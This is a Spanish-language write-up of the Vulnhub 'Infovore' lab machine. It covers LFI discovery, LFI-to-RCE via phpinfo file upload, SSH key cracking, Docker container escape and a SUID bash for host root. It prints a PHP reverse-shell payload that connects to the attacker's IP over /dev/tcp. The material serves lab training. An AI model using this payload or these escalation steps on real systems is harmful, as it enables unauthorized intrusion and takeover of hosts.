---
author: Helder
title: Vulnhub - Infovore
tags : [Linux,phpinfo]
categories: [Vulnhub,Eazy]
date: 2023-10-15 11:33:00 +0800
mermaid: true
---
Description: This is an easy to intermediate box that shows you how you can exploit innocent looking php functions and lazy sys admins.
There are 4 flags in total to be found, and you will have to think outside the box and try alternative ways to achieve your goal of capturing all flags.

Máquina [**Infovore**](https://www.vulnhub.com/entry/infovore-1,496/)

---
## Reconocimiento
- [ ] Identificamos el Target y escaneamos los puertos abiertos.

![arp](https://helhat.github.io/assets/img/Infovore/arp.png){: .normal }
![scan](https://helhat.github.io/assets/img/Infovore/scan1.png){: .normal }

- [ ] Realizamos el escaneo de los principales scripts y versiones de nmap.

![scan2](https://helhat.github.io/assets/img/Infovore/scan2.png){: .normal }

De esta manera empezaremos buscando las principales tecnologias web.

![what](https://helhat.github.io/assets/img/Infovore/what.png){: .normal }
![include](https://helhat.github.io/assets/img/Infovore/include.png){: .normal }

Realizaremos un fuzzing, pero no tenemos éxito.

![fuzz](https://helhat.github.io/assets/img/Infovore/fuzz1.png){: .normal }

- [ ] Analizamos con wig

![wig](https://helhat.github.io/assets/img/Infovore/wig.png){: .normal }

## Enumeración

De esta manera ingresamos a la ruta. Revisaremos por funciones deshabilitados y file_upload.

![info](https://helhat.github.io/assets/img/Infovore/info.png){: .normal }
![file](https://helhat.github.io/assets/img/Infovore/file.png){: .normal }

Entonces verificamos que esta pagina interpretaría cualquier función en php, ademas de un posible file_uploads activado, pero para esto debemos saber donde subir el archivo.

## Explotación

- [ ] LFI2RCE
Simulamos una File Upload boundary
De esta manera tenemos una respuesta exitosa, donde se crea el archivo mencionado y se carga en la ruta temporal que se muestra en la Respuesta.

![burp](https://helhat.github.io/assets/img/Infovore/burp.png){: .normal }

Entonces para poder ingresar un archivo que haga un RCE, primero debemos identificar la ruta donde introducirlo.

- [ ] Encontrar un LFI, fuzzeando parámetro 
Normalmente en una web, la pagina principal suele ser un recurso index. , como tecnologia usa php, entonces tendra como recurso: 

![index](https://helhat.github.io/assets/img/Infovore/index.png){: .normal }

Entonces, para aplicar un LFI , debemos encontrar aquel parámetro que nos permita buscar la ruta donde aplicar el RCE.
Para ello realizamos un fuzzeo a este parámetro mencionado. Para el primer fuzzing, detectamos respuestas con 136L

![fuzz2](https://helhat.github.io/assets/img/Infovore/fuzz2.png){: .normal }

Filtramos por ello y realizamos nuevamente el fuzzing, imaginando que deseamos acceder a /etc/passwd.

![fuzz3](https://helhat.github.io/assets/img/Infovore/fuzz3.png){: .normal }
![filename](https://helhat.github.io/assets/img/Infovore/filename.png){: .normal }
![LFI](https://helhat.github.io/assets/img/Infovore/LFI.png){: .normal }

- [ ] Script modificamos los campos.

![script](https://helhat.github.io/assets/img/Infovore/script.png){: .normal }

```
<?php system("bash -c 'bash -i >& /dev/tcp/192.168.65.139/443 0>&1'");?>
```
Cambiamos la ruta del método POST y GET . Además cambiamos los *[tmp_name]* , que es el resultado del Response en burpsuite.

![burp2](https://helhat.github.io/assets/img/Infovore/burp2.png){: .normal }
![tmp](https://helhat.github.io/assets/img/Infovore/tmp.png){: .normal }

De esta manera:

![exploit](https://helhat.github.io/assets/img/Infovore/exploit.png){: .normal }
![exploit2](https://helhat.github.io/assets/img/Infovore/exploit2.png){: .normal }

- [ ] Ejecutamos python2.7
![[IMAGES/Infovore/RCE.png]]
![RCE](https://helhat.github.io/assets/img/Infovore/RCE.png){: .normal }

Tendremos en cuenta que es un Docker, ya que no es la IP de la PC auditada.
![[IMAGES/Infovore/access.png]]
![access](https://helhat.github.io/assets/img/Infovore/access.png){: .normal }

---
## Persistencia
- [ ] Enumeración manual o LinPEAS

![enum](https://helhat.github.io/assets/img/Infovore/enum.png){: .normal }

Buscando elementos importantes y permisos, encontramos un archivo con un nombre que suponemos tiene keys ssh

![key](https://helhat.github.io/assets/img/Infovore/key.png){: .normal }

- [ ] Verificar Segmento IP
- [ ] Comprobar port 22 expuesto

![port](https://helhat.github.io/assets/img/Infovore/port.png){: .normal }
![copy](https://helhat.github.io/assets/img/Infovore/copy.png){: .normal }
![permi](https://helhat.github.io/assets/img/Infovore/permi.png){: .normal }

Nos copiamos el archivo a un archivo que tengamos permisos /tmp y verificamos que tipo de comprimido es.

```
file .olkeys.tgz
```

![descom](https://helhat.github.io/assets/img/Infovore/descom.png){: .normal }
Tenemos 2 llaves, utilizaremos la privada.

- [ ] Crackear key encriptada

![crack](https://helhat.github.io/assets/img/Infovore/crack.png){: .normal }

- [ ] Reutilizamos esta passwd

![root](https://helhat.github.io/assets/img/Infovore/root.png){: .normal }

- [ ] Flag para root

![flag](https://helhat.github.io/assets/img/Infovore/flag.png){: .normal }

- [ ] Escapamos del contenedor
Pero como ya sabemos estamos dentro de un contenedor, por que estamos bajo un segmento de Red diferente.
De esta manera si buscamos escapar de este, pero no encontramos ningún deamon de docker. Pero en la misma carpeta root, encontramos Keys ssh , en la cual vemos una conexion con un usuario admin, con un segmento de Red que pertenece a la Maquina host.

![key2](https://helhat.github.io/assets/img/Infovore/key2.png){: .normal }

Entonces nos conectamos por ssh, de igual manera aprovechamos la hash crackeada anteriormente para ingresar

![port2](https://helhat.github.io/assets/img/Infovore/port2.png){: .normal }

- [ ] Utilizamos la imagen para desplegar una montura

![flag2](https://helhat.github.io/assets/img/Infovore/flag2.png){: .normal }
![docker](https://helhat.github.io/assets/img/Infovore/docker.png){: .normal }

De esta manera utilizaremos la imagen de este Docker para crear una montura de la carpeta /root de la Maquina Host real.

![mont](https://helhat.github.io/assets/img/Infovore/mont.png){: .normal }
![mont2](https://helhat.github.io/assets/img/Infovore/mont2.png){: .normal }

- [ ] Ejecutar contenedor

![ejec](https://helhat.github.io/assets/img/Infovore/ejec.png){: .normal }
![root2](https://helhat.github.io/assets/img/Infovore/root2.png){: .normal }
![flag3](https://helhat.github.io/assets/img/Infovore/flag3.png){: .normal }

- [ ] Asignar Suid bash
Pero de igual manera, lo anterior es util para un CTF, que ta si queremos realmente acceso como root de la Maquina host?

![bash](https://helhat.github.io/assets/img/Infovore/bash.png){: .normal }

- [ ] You are Root

![root3](https://helhat.github.io/assets/img/Infovore/root3.png){: .normal }

